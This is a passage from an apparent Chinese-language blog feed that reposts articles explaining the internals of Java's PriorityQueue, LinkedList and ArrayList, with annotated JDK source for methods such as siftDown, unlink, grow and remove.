punctuation">;</span><span class="token comment" spellcheck="true">//调整</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>上述代码首先记录<code>0</code>下标处的元素，并用最后一个元素替换<code>0</code>下标位置的元素，之后调用<code>siftDown()</code>方法对堆进行调整，最后返回原来<code>0</code>下标处的那个元素（也就是最小的那个元素）。重点是<code>siftDown(int k, E x)</code>方法，该方法的作用是<strong>从k指定的位置开始，将x逐层向下与当前点的左右孩子中较小的那个交换，直到x小于或等于左右孩子中的任何一个为止</strong>。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//siftDown()</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">siftDown</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> E x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> half <span class="token operator">=</span> size <span class="token operator">>>></span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>k <span class="token operator">&lt;</span> half<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//首先找到左右孩子中较小的那个，记录到c里，并用child记录其下标</span>        <span class="token keyword">int</span> child <span class="token operator">=</span> <span class="token punctuation">(</span>k <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//leftNo = parentNo*2+1</span>        Object c <span class="token operator">=</span> queue<span class="token punctuation">[</span>child<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> right <span class="token operator">=</span> child <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>right <span class="token operator">&lt;</span> size <span class="token operator">&amp;&amp;</span>            comparator<span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span><span class="token punctuation">(</span>E<span class="token punctuation">)</span> c<span class="token punctuation">,</span> <span class="token punctuation">(</span>E<span class="token punctuation">)</span> queue<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>            c <span class="token operator">=</span> queue<span class="token punctuation">[</span>child <span class="token operator">=</span> right<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>comparator<span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token punctuation">(</span>E<span class="token punctuation">)</span> c<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        queue<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//然后用c取代原来的值</span>        k <span class="token operator">=</span> child<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    queue<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="remove-Object-o"><a href="#remove-Object-o" class="headerlink" title="remove(Object o)"></a>remove(Object o)</h2><p><code>remove(Object o)</code>方法用于删除队列中跟<code>o</code>相等的某一个元素（如果有多个相等，只删除一个），该方法不是<em>Queue</em>接口内的方法，而是<em>Collection</em>接口的方法。由于删除操作会改变队列结构，所以要进行调整；又由于删除元素的位置可能是任意的，所以调整过程比其它函数稍加繁琐。具体来说，<code>remove(Object o)</code>可以分为2种情况：1. 删除的是最后一个元素。直接删除即可，不需要调整。2. 删除的不是最后一个元素，从删除点开始以最后一个元素为参照调用一次<code>siftDown()</code>即可。此处不再赘述。</p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/PriorityQueue_remove2.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/PriorityQueue_remove2.png" alt="PriorityQueue_remove2.png"></a></p><p>具体代码如下：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//remove(Object o)</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">remove</span><span class="token punctuation">(</span>Object o<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//通过遍历数组的方式找到第一个满足o.equals(queue[i])元素的下标</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">indexOf</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> s <span class="token operator">=</span> <span class="token operator">--</span>size<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> i<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//情况1</span>        queue<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        E moved <span class="token operator">=</span> <span class="token punctuation">(</span>E<span class="token punctuation">)</span> queue<span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token punctuation">;</span>        queue<span class="token punctuation">[</span>s<span class="token punctuation">]</span> <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token function">siftDown</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> moved<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//情况2</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>本文转载自: <a href="https://github.com/CarpenterLee/JCFInternals/blob/master/markdown/8-PriorityQueue.md">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java容器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LinkedList</title>
      <link href="/2019/01/21/java/java-rong-qi/linkedlist/"/>
      <url>/2019/01/21/java/java-rong-qi/linkedlist/</url>
      
        <content type="html"><![CDATA[<h1 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h1><h1 id="总体介绍"><a href="#总体介绍" class="headerlink" title="总体介绍"></a>总体介绍</h1><p><em>LinkedList</em>同时实现了<em>List</em>接口和<em>Deque</em>接口，也就是说它既可以看作一个顺序容器，又可以看作一个队列（<em>Queue</em>），同时又可以看作一个栈（<em>Stack</em>）。这样看来，<em>LinkedList</em>简直就是个全能冠军。当你需要使用栈或者队列时，可以考虑使用<em>LinkedList</em>，一方面是因为Java官方已经声明不建议使用<em>Stack</em>类，更遗憾的是，Java里根本没有一个叫做<em>Queue</em>的类（它是个接口名字）。关于栈或队列，现在的首选是<em>ArrayDeque</em>，它有着比<em>LinkedList</em>（当作栈或队列使用时）有着更好的性能。</p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/LinkedList_base.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/LinkedList_base.png" alt="LinkedList_base"></a></p><p><em>LinkedList</em>底层<strong>通过双向链表实现</strong>，本节将着重讲解插入和删除元素时双向链表的维护过程，也即是直接跟<em>List</em>接口相关的函数，而将<em>Queue</em>和<em>Stack</em>以及<em>Deque</em>相关的知识放在下一节讲。双向链表的每个节点用内部类<em>Node</em>表示。<em>LinkedList</em>通过<code>first</code>和<code>last</code>引用分别指向链表的第一个和最后一个元素。注意这里没有所谓的哑元，当链表为空的时候<code>first</code>和<code>last</code>都指向<code>null</code>。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//Node内部类</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Node</span><span class="token operator">&lt;</span>E<span class="token operator">></span> <span class="token punctuation">{</span>    E item<span class="token punctuation">;</span>    Node<span class="token operator">&lt;</span>E<span class="token operator">></span> next<span class="token punctuation">;</span>    Node<span class="token operator">&lt;</span>E<span class="token operator">></span> prev<span class="token punctuation">;</span>    <span class="token function">Node</span><span class="token punctuation">(</span>Node<span class="token operator">&lt;</span>E<span class="token operator">></span> prev<span class="token punctuation">,</span> E element<span class="token punctuation">,</span> Node<span class="token operator">&lt;</span>E<span class="token operator">></span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>item <span class="token operator">=</span> element<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>next <span class="token operator">=</span> next<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>prev <span class="token operator">=</span> prev<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><em>LinkedList</em>的实现方式决定了所有跟下标相关的操作都是线性时间，而在首段或者末尾删除元素只需要常数时间。为追求效率<em>LinkedList</em>没有实现同步（synchronized），如果需要多个线程并发访问，可以先采用<code>Collections.synchronizedList()</code>方法对其进行包装。</p><h1 id="方法剖析"><a href="#方法剖析" class="headerlink" title="方法剖析"></a>方法剖析</h1><h2 id="add"><a href="#add" class="headerlink" title="add()"></a>add()</h2><p><em>add()方法有两个版本，一个是add(E e)，该方法在LinkedList</em>的末尾插入元素，因为有<code>last</code>指向链表末尾，在末尾插入元素的花费是常数时间。只需要简单修改几个相关引用即可；另一个是<code>add(int index, E element)</code>，该方法是在指定下表处插入元素，需要先通过线性查找找到具体位置，然后修改相关引用完成插入操作。</p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/LinkedList_add.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/LinkedList_add.png" alt="LinkedList_add"></a></p><p>结合上图，可以看出<code>add(E e)</code>的逻辑非常简单。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//add(E e)</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">add</span><span class="token punctuation">(</span>E e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">final</span> Node<span class="token operator">&lt;</span>E<span class="token operator">></span> l <span class="token operator">=</span> last<span class="token punctuation">;</span>    <span class="token keyword">final</span> Node<span class="token operator">&lt;</span>E<span class="token operator">></span> newNode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> e<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>    last <span class="token operator">=</span> newNode<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">==</span> null<span class="token punctuation">)</span>        first <span class="token operator">=</span> newNode<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//原来链表为空，这是插入的第一个元素</span>    <span class="token keyword">else</span>        l<span class="token punctuation">.</span>next <span class="token operator">=</span> newNode<span class="token punctuation">;</span>    size<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><code>add(int index, E element)</code>的逻辑稍显复杂，可以分成两部分，1.先根据index找到要插入的位置；2.修改引用，完成插入操作。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//add(int index, E element)</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span> E element<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">checkPositionIndex</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//index >= 0 &amp;&amp; index &lt;= size;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">==</span> size<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//插入位置是末尾，包括列表为空的情况</span>        <span class="token function">add</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        Node<span class="token operator">&lt;</span>E<span class="token operator">></span> succ <span class="token operator">=</span> <span class="token function">node</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//1.先根据index找到要插入的位置</span>        <span class="token comment" spellcheck="true">//2.修改引用，完成插入操作。</span>        <span class="token keyword">final</span> Node<span class="token operator">&lt;</span>E<span class="token operator">></span> pred <span class="token operator">=</span> succ<span class="token punctuation">.</span>prev<span class="token punctuation">;</span>        <span class="token keyword">final</span> Node<span class="token operator">&lt;</span>E<span class="token operator">></span> newNode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>pred<span class="token punctuation">,</span> e<span class="token punctuation">,</span> succ<span class="token punctuation">)</span><span class="token punctuation">;</span>        succ<span class="token punctuation">.</span>prev <span class="token operator">=</span> newNode<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pred <span class="token operator">==</span> null<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//插入位置为0</span>            first <span class="token operator">=</span> newNode<span class="token punctuation">;</span>        <span class="token keyword">else</span>            pred<span class="token punctuation">.</span>next <span class="token operator">=</span> newNode<span class="token punctuation">;</span>        size<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>上面代码中的<code>node(int index)</code>函数有一点小小的trick，因为链表双向的，可以从开始往后找，也可以从结尾往前找，具体朝那个方向找取决于条件<code>index &lt; (size &gt;&gt; 1)</code>，也即是index是靠近前端还是后端。</p><h2 id="remove"><a href="#remove" class="headerlink" title="remove()"></a>remove()</h2><p><code>remove()</code>方法也有两个版本，一个是删除跟指定元素相等的第一个元素<code>remove(Object o)</code>，另一个是删除指定下标处的元素<code>remove(int index)</code>。</p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/LinkedList_remove.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/LinkedList_remove.png" alt="LinkedList_remove.png"></a></p><p>两个删除操作都要1.先找到要删除元素的引用，2.修改相关引用，完成删除操作。在寻找被删元素引用的时候<code>remove(Object o)</code>调用的是元素的<code>equals</code>方法，而<code>remove(int index)</code>使用的是下标计数，两种方式都是线性时间复杂度。在步骤2中，两个<code>revome()</code>方法都是通过<code>unlink(Node&lt;E&gt; x)</code>方法完成的。这里需要考虑删除元素是第一个或者最后一个时的边界情况。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//unlink(Node&lt;E> x)，删除一个Node</span>E <span class="token function">unlink</span><span class="token punctuation">(</span>Node<span class="token operator">&lt;</span>E<span class="token operator">></span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">final</span> E element <span class="token operator">=</span> x<span class="token punctuation">.</span>item<span class="token punctuation">;</span>    <span class="token keyword">final</span> Node<span class="token operator">&lt;</span>E<span class="token operator">></span> next <span class="token operator">=</span> x<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token keyword">final</span> Node<span class="token operator">&lt;</span>E<span class="token operator">></span> prev <span class="token operator">=</span> x<span class="token punctuation">.</span>prev<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>prev <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//删除的是第一个元素</span>        first <span class="token operator">=</span> next<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        prev<span class="token punctuation">.</span>next <span class="token operator">=</span> next<span class="token punctuation">;</span>        x<span class="token punctuation">.</span>prev <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>next <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//删除的是最后一个元素</span>        last <span class="token operator">=</span> prev<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        next<span class="token punctuation">.</span>prev <span class="token operator">=</span> prev<span class="token punctuation">;</span>        x<span class="token punctuation">.</span>next <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    x<span class="token punctuation">.</span>item <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//let GC work</span>    size<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> element<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h1 id="get"><a href="#get" class="headerlink" title="get()"></a>get()</h1><p><code>get(int index)</code>得到指定下标处元素的引用，通过调用上文中提到的<code>node(int index)</code>方法实现。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> E <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">checkElementIndex</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//index >= 0 &amp;&amp; index &lt; size;</span>    <span class="token keyword">return</span> <span class="token function">node</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>item<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h1 id="set"><a href="#set" class="headerlink" title="set()"></a>set()</h1><p><code>set(int index, E element)</code>方法将指定下标处的元素修改成指定值，也是先通过<code>node(int index)</code>找到对应下表元素的引用，然后修改<code>Node</code>中<code>item</code>的值。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> E <span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span> E element<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">checkElementIndex</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>    Node<span class="token operator">&lt;</span>E<span class="token operator">></span> x <span class="token operator">=</span> <span class="token function">node</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>    E oldVal <span class="token operator">=</span> x<span class="token punctuation">.</span>item<span class="token punctuation">;</span>    x<span class="token punctuation">.</span>item <span class="token operator">=</span> element<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//替换新值</span>    <span class="token keyword">return</span> oldVal<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>本文转载自: <a href="https://github.com/CarpenterLee/JCFInternals/blob/master/markdown/3-LinkedList.md">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java容器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ArrayList</title>
      <link href="/2019/01/20/java/java-rong-qi/arraylist/"/>
      <url>/2019/01/20/java/java-rong-qi/arraylist/</url>
      
        <content type="html"><![CDATA[<h1 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h1><h1 id="总体介绍"><a href="#总体介绍" class="headerlink" title="总体介绍"></a>总体介绍</h1><p><em>ArrayList</em>实现了<em>List</em>接口，是顺序容器，即元素存放的数据与放进去的顺序相同，允许放入<code>null</code>元素，底层通过<strong>数组实现</strong>。除该类未实现同步外，其余跟<em>Vector</em>大致相同。每个<em>ArrayList</em>都有一个容量（capacity），表示底层数组的实际大小，容器内存储元素的个数不能多于当前容量。当向容器中添加元素时，如果容量不足，容器会自动增大底层数组的大小。前面已经提过，Java泛型只是编译器提供的语法糖，所以这里的数组是一个Object数组，以便能够容纳任何类型的对象。</p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/ArrayList_base.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/ArrayList_base.png" alt="ArrayList_base"></a></p><p>size(), isEmpty(), get(), set()方法均能在常数时间内完成，add()方法的时间开销跟插入位置有关，addAll()方法的时间开销跟添加元素的个数成正比。其余方法大都是线性时间。</p><p>为追求效率，ArrayList没有实现同步（synchronized），如果需要多个线程并发访问，用户可以手动同步，也可使用Vector替代。</p><h1 id="方法剖析"><a href="#方法剖析" class="headerlink" title="方法剖析"></a>方法剖析</h1><h2 id="set"><a href="#set" class="headerlink" title="set()"></a>set()</h2><p>既然底层是一个数组<em>ArrayList</em>的<code>set()</code>方法也就变得非常简单，直接对数组的指定位置赋值即可。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> E <span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span> E element<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">rangeCheck</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//下标越界检查</span>    E oldValue <span class="token operator">=</span> <span class="token function">elementData</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>    elementData<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> element<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//赋值到指定位置，复制的仅仅是引用</span>    <span class="token keyword">return</span> oldValue<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="get"><a href="#get" class="headerlink" title="get()"></a>get()</h2><p><code>get()</code>方法同样很简单，唯一要注意的是由于底层数组是Object[]，得到元素后需要进行类型转换。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> E <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">rangeCheck</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>E<span class="token punctuation">)</span> elementData<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//注意类型转换</span><span class="token punctuation">}</span></code></pre><h2 id="add"><a href="#add" class="headerlink" title="add()"></a>add()</h2><p>跟C++ 的<em>vector</em>不同，<em>ArrayList</em>没有<code>push_back()</code>方法，对应的方法是<code>add(E e)</code>，<em>ArrayList</em>也没有<code>insert()</code>方法，对应的方法是<code>add(int index, E e)</code>。这两个方法都是向容器中添加新元素，这可能会导致<em>capacity</em>不足，因此在添加元素之前，都需要进行剩余空间检查，如果需要则自动扩容。扩容操作最终是通过<code>grow()</code>方法完成的。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">grow</span><span class="token punctuation">(</span><span class="token keyword">int</span> minCapacity<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> oldCapacity <span class="token operator">=</span> elementData<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span> newCapacity <span class="token operator">=</span> oldCapacity <span class="token operator">+</span> <span class="token punctuation">(</span>oldCapacity <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//原来的1.5倍</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>newCapacity <span class="token operator">-</span> minCapacity <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        newCapacity <span class="token operator">=</span> minCapacity<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>newCapacity <span class="token operator">-</span> MAX_ARRAY_SIZE <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        newCapacity <span class="token operator">=</span> <span class="token function">hugeCapacity</span><span class="token punctuation">(</span>minCapacity<span class="token punctuation">)</span><span class="token punctuation">;</span>    elementData <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>elementData<span class="token punctuation">,</span> newCapacity<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//扩展空间并复制</span><span class="token punctuation">}</span></code></pre><p>由于Java GC自动管理了内存，这里也就不需要考虑源数组释放的问题。</p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/ArrayList_grow.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/ArrayList_grow.png" alt="ArrayList_grow"></a></p><p>空间的问题解决后，插入过程就显得非常简单。</p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/ArrayList_add.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/ArrayList_add.png" alt="ArrayList_add"></a></p><p><code>add(int index, E e)</code>需要先对元素进行移动，然后完成插入操作，也就意味着该方法有着线性的时间复杂度。</p><h2 id="addAll"><a href="#addAll" class="headerlink" title="addAll()"></a>addAll()</h2><p><code>addAll()</code>方法能够一次添加多个元素，根据位置不同也有两个版本，一个是在末尾添加的<code>addAll(Collection&lt;? extends E&gt; c)</code>方法，一个是从指定位置开始插入的<code>addAll(int index, Collection&lt;? extends E&gt; c)</code>方法。跟<code>add()</code>方法类似，在插入之前也需要进行空间检查，如果需要则自动扩容；如果从指定位置插入，也会存在移动元素的情况。 <code>addAll()</code>的时间复杂度不仅跟插入元素的多少有关，也跟插入的位置相关。</p><h2 id="remove"><a href="#remove" class="headerlink" title="remove()"></a>remove()</h2><p><code>remove()</code>方法也有两个版本，一个是<code>remove(int index)</code>删除指定位置的元素，另一个是<code>remove(Object o)</code>删除第一个满足<code>o.equals(elementData[index])</code>的元素。删除操作是<code>add()</code>操作的逆过程，需要将删除点之后的元素向前移动一个位置。需要注意的是为了让GC起作用，必须显式的为最后一个位置赋<code>null</code>值。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> E <span class="token function">remove</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">rangeCheck</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>    modCount<span class="token operator">++</span><span class="token punctuation">;</span>    E oldValue <span class="token operator">=</span> <span class="token function">elementData</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> numMoved <span class="token operator">=</span> size <span class="token operator">-</span> index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>numMoved <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        System<span class="token punctuation">.</span><span class="token function">arraycopy</span><span class="token punctuation">(</span>elementData<span class="token punctuation">,</span> index<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> elementData<span class="token punctuation">,</span> index<span class="token punctuation">,</span> numMoved<span class="token punctuation">)</span><span class="token punctuation">;</span>    elementData<span class="token punctuation">[</span><span class="token operator">--</span>size<span class="token punctuation">]</span> <span class="token operator">=</span> null<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//清除该位置的引用，让GC起作用</span>    <span class="token keyword">return</span> oldValue<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>关于Java GC这里需要特别说明一下，<strong>有了垃圾收集器并不意味着一定不会有内存泄漏</strong>。对象能否被GC的依据是是否还有引用指向它，上面代码中如果不手动赋<code>null</code>值，除非对应的位置被其他元素覆盖，否则原来的对象就一直不会被回收。</p><p>本文转载自: <a href="https://github.com/CarpenterLee/JCFInternals/blob/master/markdown/2-ArrayList.md">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java容器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HashSet and HashMap</title>
      <link href="/2019/01/19/java/java-rong-qi/hashset-and-hashmap/"/>
      <url>/2019/01/19/java/java-rong-qi/hashset-and-hashmap/</url>
      
